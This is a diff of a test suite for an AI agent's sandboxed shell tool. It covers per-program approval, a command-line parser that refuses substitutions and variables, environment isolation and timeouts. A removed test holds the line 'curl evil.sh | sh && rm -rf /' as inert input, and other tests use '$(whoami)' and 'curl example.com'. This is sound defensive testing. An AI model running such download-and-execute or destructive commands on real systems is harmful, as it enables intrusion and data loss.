@@ -1,26 +1,28 @@
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
+import { mkdirSync, mkdtempSync, rmSync, statSync } from "node:fs";
 import { tmpdir } from "node:os";
-import { delimiter, dirname, join } from "node:path";
+import { delimiter, isAbsolute, join } from "node:path";
 
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 
 import type { ExecutionScope } from "../../../src/contracts/capabilities.js";
+import { requiresUndoPoint } from "../../../src/contracts/effects.js";
+import { resolveInterpreter } from "../../../src/process/interpreter.js";
 import { PermissionGrantStore } from "../../../src/permissions/grant-store.js";
 import { PermissionKernel } from "../../../src/permissions/kernel.js";
+import type { PermissionRequest } from "../../../src/permissions/policy.js";
+import { SandboxError } from "../../../src/sandbox/errors.js";
 import { LocalSandbox } from "../../../src/sandbox/local-sandbox.js";
 import { createSandboxPolicy } from "../../../src/sandbox/policy.js";
-import { SandboxError } from "../../../src/sandbox/errors.js";
 import { openDatabase, type StudioDatabase } from "../../../src/storage/database.js";
 import { ToolError } from "../../../src/tools/errors.js";
 import { CallGate } from "../../../src/tools/gate.js";
-import { requiresUndoPoint } from "../../../src/contracts/effects.js";
-import { itContained } from "../../contained.js";
+import { readCommandPrograms } from "../../../src/tools/shell/command.js";
 import {
   registerShellTools,
-  resolveProgram,
   shellResource,
   SHELL_DESCRIPTOR,
 } from "../../../src/tools/shell/index.js";
+import { CAN_CONTAIN, itContained } from "../../contained.js";
 
 const SCOPE: ExecutionScope = {
   conversationId: "conv-1",
@@ -30,6 +32,27 @@ const SCOPE: ExecutionScope = {
 
 /** node is the one program guaranteed to exist wherever these tests run. */
 const NODE = process.execPath;
+/** Quoted for the interpreter, since an absolute path may contain spaces. */
+const NODEQ = `"${NODE}"`;
+
+/** True when npm sits somewhere on this machine's program path. */
+function npmOnPath(): boolean {
+  for (const entry of (process.env.PATH ?? "").split(delimiter)) {
+    const directory = entry.trim().replace(/^"|"$/g, "");
+    if (directory === "") continue;
+    for (const name of process.platform === "win32" ? ["npm.cmd", "npm.exe"] : ["npm"]) {
+      try {
+        if (statSync(join(directory, name)).isFile()) return true;
+      } catch {
+        // Not in this directory.
+      }
+    }
+  }
+  return false;
+}
+
+/** Runs only where containment works and npm is installed: the shim proof. */
+const itRunsNpm = CAN_CONTAIN && npmOnPath() ? itContained : it.skip;
 
 let db: StudioDatabase;
 let workspace: string;
@@ -44,19 +67,34 @@ afterEach(() => {
   rmSync(workspace, { recursive: true, force: true });
 });
 
-function gate(options: { allowExec?: boolean } = {}) {
+/** What the kernel was asked about, in order. */
+function recordingApprover() {
+  const asked: (string | undefined)[] = [];
+  return {
+    asked,
+    request: async (request: PermissionRequest) => {
+      asked.push(request.resource);
+      return { verdict: "allow" as const, duration: "once" as const };
+    },
+  };
+}
+
+function gate(options: { allowExec?: boolean; approver?: ReturnType<typeof recordingApprover> } = {}) {
   const sandbox = new LocalSandbox(
     createSandboxPolicy({
       workspaceRoot: workspace,
       allowExec: options.allowExec ?? true,
+      // The same grant the runtime makes: a shell's job is finding programs,
+      // and the approval names them instead of their resolved paths.
+      environment: { PATH: process.env.PATH ?? "" },
     }),
   );
   const instance = new CallGate({
     kernel: new PermissionKernel({
       grants: new PermissionGrantStore(db),
-      approver: {
-        request: async () => ({ verdict: "allow" as const, duration: "once" as const }),
-      },
+      approver:
+        options.approver ??
+        { request: async () => ({ verdict: "allow" as const, duration: "once" as const }) },
     }),
     sandbox,
   });
@@ -68,7 +106,7 @@ function run(instance: CallGate, input: unknown) {
   return instance.call({ name: "native/shell", input, scope: SCOPE });
 }
 
-describe("how long a program may run", () => {
+describe("how long a command may run", () => {
   // T-15. `shell` clamped its own timeoutMs to ten minutes while the gate
   // abandoned every call at two, so a build was cut off long before the limit
   // the tool advertised. The tool now states its ceiling and the gate uses it.
@@ -82,18 +120,16 @@ describe("how long a program may run", () => {
   });
 });
 
-describe("running a program", () => {
+describe("running a command line", () => {
   // `itContained` on everything that actually starts one. The shell tool is
-  // owed `os` isolation, so on a host that cannot supply it the call is refused
-  // — correctly, and that refusal is asserted in the sandbox integration
-  // suites. What is *not* gated is everything decided before the spawn: a
-  // working directory outside the project, a command passed as one string, a
-  // policy that never opted in. Those are this file's own subject and they hold
-  // on every machine.
+  // owed `os` isolation, so on a host that cannot supply it the call is
+  // refused - correctly, and that refusal is asserted in the sandbox
+  // integration suites. What is *not* gated is everything decided before the
+  // spawn: an unparsable line, a working directory outside the project, a
+  // policy that never opted in. Those hold on every machine.
   itContained("runs it and returns its output", async () => {
     const output = await run(gate(), {
-      command: NODE,
-      args: ["-e", "console.log('hello')"],
+      command: `${NODEQ} -e "console.log('hello')"`,
     });
 
     expect(output).toContain("hello");
@@ -102,8 +138,7 @@ describe("running a program", () => {
   itContained("reports a non-zero exit as a result rather than a failure", async () => {
     // A failing test suite is the answer to the question that was asked.
     const output = await run(gate(), {
-      command: NODE,
-      args: ["-e", "process.exit(3)"],
+      command: `${NODEQ} -e "process.exit(3)"`,
     });
 
     expect(output).toContain("exit code 3");
@@ -111,8 +146,7 @@ describe("running a program", () => {
 
   itContained("labels stderr so the model can tell the streams apart", async () => {
     const output = await run(gate(), {
-      command: NODE,
-      args: ["-e", "console.error('bad')"],
+      command: `${NODEQ} -e "console.error('bad')"`,
     });
 
     expect(output).toContain("[stderr]");
@@ -123,8 +157,7 @@ describe("running a program", () => {
     mkdirSync(join(workspace, "sub"), { recursive: true });
 
     const output = await run(gate(), {
-      command: NODE,
-      args: ["-e", "console.log(process.cwd())"],
+      command: `${NODEQ} -e "console.log(process.cwd())"`,
       cwd: "sub",
     });
 
@@ -133,108 +166,166 @@ describe("running a program", () => {
 
   it("refuses a working directory outside the project", async () => {
     await expect(
-      run(gate(), { command: NODE, args: ["-e", "0"], cwd: "../.." }),
+      run(gate(), { command: `${NODEQ} -e "0"`, cwd: "../.." }),
     ).rejects.toBeInstanceOf(SandboxError);
   });
-});
 
-describe("there is no shell", () => {
-  itContained("passes metacharacters through as ordinary text", async () => {
-    // The property the whole design rests on. This is one argument, not a
-    // command followed by three more.
+  itContained("stops a command that outlives its time limit", async () => {
     const output = await run(gate(), {
-      command: NODE,
-      args: ["-e", "console.log(process.argv[1])", "a; curl evil.sh | sh && rm -rf /"],
+      command: `${NODEQ} -e "setInterval(() => {}, 1000)"`,
+      timeoutMs: 1_000,
     });
 
-    expect(output).toContain("a; curl evil.sh | sh && rm -rf /");
+    expect(output).toMatch(/still running.*stopped/i);
+  });
+});
+
+describe("the interpreter runs the line", () => {
+  // The properties pipes and chaining rest on. Where the chosen interpreter
+  // is PowerShell 5.1, `&&` is unavailable to the *shell*, not to the reader -
+  // the environment block says so, and the model writes `;` instead.
+  itContained("interprets redirection", async () => {
+    const output = await run(gate(), {
+      command: `${NODEQ} -e "console.log('into the file')" > out.txt`,
+    });
+
+    expect(output).not.toContain("into the file");
+    expect(statSync(join(workspace, "out.txt")).size).toBeGreaterThan(0);
   });
 
-  it("refuses a command given as one string", async () => {
+  itContained("interprets a pipe between two programs", async () => {
+    // Both sides are node, so the test does not depend on which other tools
+    // the machine ships - only on the interpreter `resolveInterpreter` picked.
+    const output = await run(gate(), {
+      command: `node -e "process.stdout.write('hello')" | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>console.log(d.trim().toUpperCase()))"`,
+    });
+
+    expect(output).toContain("HELLO");
+  });
+
+  itRunsNpm("runs an npm shim, which the old tool refused outright", async () => {
+    // npm is a .cmd shim on Windows: `resolveProgram` refused it by name, and
+    // this one result is the whole reason the tool takes a command line now.
+    const output = await run(gate(), { command: "npm --version" });
+
+    expect(output).toMatch(/(^|\n)\d+\.\d+\.\d+/);
+  });
+});
+
+describe("the interpreter is chosen once, by the machine", () => {
+  it("resolves to a real absolute executable whose statement the model can read", () => {
+    const interpreter = resolveInterpreter();
+
+    // Every machine this suite runs on has some shell: /bin/sh on POSIX,
+    // powershell or cmd on Windows. Undefined here would mean the shell tool
+    // refuses everywhere, which the environment-block test would also catch.
+    expect(interpreter).toBeDefined();
+    expect(isAbsolute(interpreter?.path ?? "/")).toBe(true);
+    expect(statSync(interpreter?.path ?? "/").isFile()).toBe(true);
+    expect(interpreter?.statement.join(" ")).toMatch(/Commands run through/);
+  });
+});
+
+describe("every program a line names is authorized", () => {
+  it("asks once per program, in the order the line names them", async () => {
+    const approver = recordingApprover();
+    await run(gate({ approver }), {
+      command: `${NODEQ} -e "console.log(1)" && definitely-not-a-real-program`,
+    });
+
+    expect(approver.asked).toEqual(["shell:node", "shell:definitely-not-a-real-program"]);
+  });
+
+  it("runs nothing when one of the named programs is declined", async () => {
+    const kernel = new PermissionKernel({
+      grants: new PermissionGrantStore(db),
+      approver: {
+        request: async (request) =>
+          request.resource === "shell:node"
+            ? { verdict: "allow" as const, duration: "once" as const }
+            : { verdict: "deny" as const, duration: "once" as const },
+      },
+    });
+    const instance = new CallGate({
+      kernel,
+      sandbox: new LocalSandbox(
+        createSandboxPolicy({ workspaceRoot: workspace, environment: { PATH: process.env.PATH ?? "" } }),
+      ),
+    });
+    registerShellTools(instance);
+
     await expect(
-      run(gate(), { command: NODE, args: "-e 'console.log(1)'" }),
-    ).rejects.toThrow(/list of separate arguments/i);
+      instance.call({
+        name: "native/shell",
+        input: { command: `${NODEQ} -e "0" && curl example.com` },
+        scope: SCOPE,
+      }),
+    ).rejects.toThrow(/declined/i);
+  });
+
+  it("checks the programs on both sides of a pipe", async () => {
+    const approver = recordingApprover();
+    await run(gate({ approver }), {
+      command: `${NODEQ} -e "console.log(1)" | ${NODEQ} -e "process.stdin.resume()"`,
+    });
+
+    expect(approver.asked).toEqual(["shell:node", "shell:node"]);
   });
 });
 
-describe("choosing the program", () => {
-  it("finds a program by name on the search path", () => {
-    const resolved = resolveProgram("node", {
-      searchPath: dirname(NODE),
-    });
-
-    expect(resolved.path).toBe(NODE);
-    expect(resolved.name).toBe("node");
+describe("the command reader", () => {
+  it("names every program a chain runs", () => {
+    expect(readCommandPrograms("npm run build && node check.js")).toEqual(["npm", "node"]);
+    expect(readCommandPrograms("a | b | c")).toEqual(["a", "b", "c"]);
+    expect(readCommandPrograms("git status; git push")).toEqual(["git", "git"]);
   });
 
-  it("finds the same program whether or not the extension is spelled out", () => {
-    // The extension was appended to the raw command, so `node.exe` searched for
-    // `node.exe.exe` and the caller was told node was not installed — for
-    // spelling out the extension this tool's own messages talk about.
-    if (process.platform !== "win32") return;
-
-    const bare = resolveProgram("node", { searchPath: dirname(NODE) });
-    const spelled = resolveProgram("node.exe", { searchPath: dirname(NODE) });
-
-    expect(spelled.path).toBe(bare.path);
-    // The same permission resource either way, or `shell:node` would not cover
-    // both spellings and one approval would not match the next call.
-    expect(spelled.name).toBe("node");
-    expect(shellResource(spelled.name)).toBe(shellResource(bare.name));
+  it("sees through quoting, assignments, redirects, and a call operator", () => {
+    expect(readCommandPrograms("FOO=1 npm test")).toEqual(["npm"]);
+    expect(readCommandPrograms(`"${NODE}" -e "console.log(1)" > out.txt`)).toEqual(["node"]);
+    expect(readCommandPrograms("& 'C:\\Program Files\\tool.exe' --flag")).toEqual(["tool"]);
+    expect(readCommandPrograms("npm run build &> log.txt")).toEqual(["npm"]);
+    expect(readCommandPrograms("node script.js 2>&1")).toEqual(["node"]);
+    expect(readCommandPrograms("> preface.txt node script.js")).toEqual(["node"]);
+    expect(readCommandPrograms("~/.local/bin/tool --flag")).toEqual(["tool"]);
   });
 
-  it("refuses a shim named in full for what it is, not as missing", () => {
-    // `npm.cmd` is what a user types after being told `npm` is a shim.
-    if (process.platform !== "win32") return;
-
-    writeFileSync(join(workspace, "faketool.cmd"), "@echo off");
-
-    expect(() => resolveProgram("faketool.cmd", { searchPath: workspace })).toThrow(
-      /needs a command shell/i,
-    );
+  it("strips the script extension a Windows shim is named by", () => {
+    // npm.cmd, node.exe and gen.ps1 are one program each as far as a person
+    // approving them is concerned.
+    expect(readCommandPrograms("npm.cmd --version")).toEqual(["npm"]);
+    expect(readCommandPrograms("node.exe --version")).toEqual(["node"]);
+    expect(readCommandPrograms("C:\\tools\\gen.ps1 -Name x")).toEqual(["gen"]);
   });
 
-  it("refuses a path relative to the project", () => {
-    // `./build.sh` would mean "run whatever this repository ships", which is
-    // what an untrusted checkout must not be able to arrange by being opened.
-    expect(() => resolveProgram("./build.sh")).toThrow(/full path/i);
-    expect(() => resolveProgram("scripts/build")).toThrow(/full path/i);
+  it("refuses what it cannot see, with the reason", () => {
+    expect(() => readCommandPrograms("npm run $(whoami)")).toThrow(/substitution/i);
+    expect(() => readCommandPrograms("npm run `whoami`")).toThrow(/substitution/i);
+    expect(() => readCommandPrograms("grep x <(sort y)")).toThrow(/substitution/i);
+    expect(() => readCommandPrograms("npm test << EOF")).toThrow(/substitution/i);
+    expect(() => readCommandPrograms("$TOOL build")).toThrow(/variable/i);
+    expect(() => readCommandPrograms("%TOOL% build")).toThrow(/variable/i);
+    expect(() => readCommandPrograms('npm test "unterminated')).toThrow(/unterminated quote/i);
+    expect(() => readCommandPrograms("npm && ; node")).toThrow(/names no program/i);
+    expect(() => readCommandPrograms("; npm test")).toThrow(/names no program/i);
+    expect(() => readCommandPrograms("--version")).toThrow(/option, not a/i);
+    // Control flow whose body opens with a test bracket: nothing there is a
+    // program the reader can name.
+    expect(() => readCommandPrograms("if [ -f x ]; then npm test; fi")).toThrow(/names no program/i);
   });
 
-  it("says a program is missing rather than guessing", () => {
-    expect(() => resolveProgram("definitely-not-installed", { searchPath: workspace })).toThrow(
-      /not installed/i,
-    );
-  });
+  it("refuses at parse time, so an unparsable line is never approved", async () => {
+    const approver = recordingApprover();
 
-  it("explains a Windows script shim instead of reporting it as missing", () => {
-    // npm, pnpm, yarn and most npm-installed tools are .cmd shims on Windows.
-    // "not found" would be actively misleading, since the file is right there.
-    if (process.platform !== "win32") return;
+    await expect(
+      run(gate({ approver }), { command: "$TOOL build" }),
+    ).rejects.toBeInstanceOf(ToolError);
 
-    writeFileSync(join(workspace, "faketool.cmd"), "@echo off");
-
-    expect(() => resolveProgram("faketool", { searchPath: workspace })).toThrow(
-      /needs a command shell/i,
-    );
-  });
-
-  it("prefers a real executable over a shim later on the path", () => {
-    if (process.platform !== "win32") return;
-
-    const shimDir = join(workspace, "shim");
-    mkdirSync(shimDir, { recursive: true });
-    writeFileSync(join(shimDir, "node.cmd"), "@echo off");
-
-    const resolved = resolveProgram("node", {
-      searchPath: [shimDir, dirname(NODE)].join(delimiter),
-    });
-
-    expect(resolved.path).toBe(NODE);
+    expect(approver.asked).toEqual([]);
   });
 });
 
-describe("permissions see the program, not the arguments", () => {
+describe("permissions see the program name, not the arguments", () => {
   it("matches on the program name", () => {
     expect(shellResource("node")).toBe("shell:node");
     // Lowercased, so a Windows caller naming NODE.EXE does not evade a rule.
@@ -245,43 +336,42 @@ describe("permissions see the program, not the arguments", () => {
 describe("containment", () => {
   it("refuses to run anything when the policy did not opt in", async () => {
     await expect(
-      run(gate({ allowExec: false }), { command: NODE, args: ["-e", "0"] }),
+      run(gate({ allowExec: false }), { command: `${NODEQ} -e "0"` }),
     ).rejects.toBeInstanceOf(SandboxError);
   });
 
-  itContained("does not hand the host environment to the program", async () => {
+  itContained("does not hand the host environment to the command", async () => {
     // Inheriting process.env would give every program on the machine every
-    // token on the machine.
+    // token on the machine. PATH is granted by the policy, by name; the rest
+    // of the host environment is not there.
     process.env.STUDIO_SHELL_LEAK_CHECK = "leaked";
 
     const output = await run(gate(), {
-      command: NODE,
-      args: ["-e", "console.log(String(process.env.STUDIO_SHELL_LEAK_CHECK))"],
+      command: `${NODEQ} -e "console.log(String(process.env.STUDIO_SHELL_LEAK_CHECK))"`,
     });
 
     delete process.env.STUDIO_SHELL_LEAK_CHECK;
     expect(output).toContain("undefined");
   });
 
-  itContained("stops a program that outlives its time limit", async () => {
+  itContained("receives the policy's PATH, because a shell must find programs", async () => {
+    // `node` named bare, resolved by the interpreter through the PATH the
+    // policy granted - the same grant a real `npm test` relies on.
     const output = await run(gate(), {
-      command: NODE,
-      args: ["-e", "setInterval(() => {}, 1000)"],
-      timeoutMs: 1_000,
+      command: `node -e "console.log(process.platform)"`,
     });
 
-    expect(output).toMatch(/still running.*stopped/i);
+    expect(output).toContain(process.platform);
   });
 });
 
 describe("bad input", () => {
   it("needs a command", async () => {
-    await expect(run(gate(), { args: [] })).rejects.toBeInstanceOf(ToolError);
+    await expect(run(gate(), {})).rejects.toBeInstanceOf(ToolError);
+    await expect(run(gate(), { command: "   " })).rejects.toBeInstanceOf(ToolError);
   });
 
-  it("needs text arguments", async () => {
-    await expect(run(gate(), { command: NODE, args: [1, 2] })).rejects.toThrow(
-      /must be text/i,
-    );
+  it("rejects a non-string command", async () => {
+    await expect(run(gate(), { command: 42 })).rejects.toBeInstanceOf(ToolError);
   });
 });
